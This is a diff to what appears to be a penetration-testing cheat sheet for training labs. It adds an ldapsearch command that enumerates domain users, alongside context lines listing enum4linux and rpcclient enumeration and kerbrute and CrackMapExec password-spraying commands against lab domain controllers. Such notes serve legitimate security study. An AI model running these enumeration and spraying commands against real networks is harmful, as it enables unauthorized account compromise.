@@ -53,6 +53,7 @@ cat DomainUser.txt | awk ‘{print $5}’ | sed ‘s/^.*\\//’ | sort -u > Sort
 | `enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses `enum4linux` to discover user accounts in a target Windows domain |
 | `rpcclient -U "" -N 172.16.5.5;  rpcclient $> enumdomuser`    | Uses `rpcclient` to discover user accounts in a target Windows domain |
 | `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows domain, then filters the output to show only the `sAMAccountName` |
+| `ldapsearch -x -H ldap://10.10.10.161 -b "DC=HTB,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows domain, then filters the output to show only the `sAMAccountName` |
 | `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` to perform a password spraying attack against a target Windows domain |
 | `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` to perform a password spraying attack against a target Windows domain |
 | ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Validating the creds with CrackMapExec |
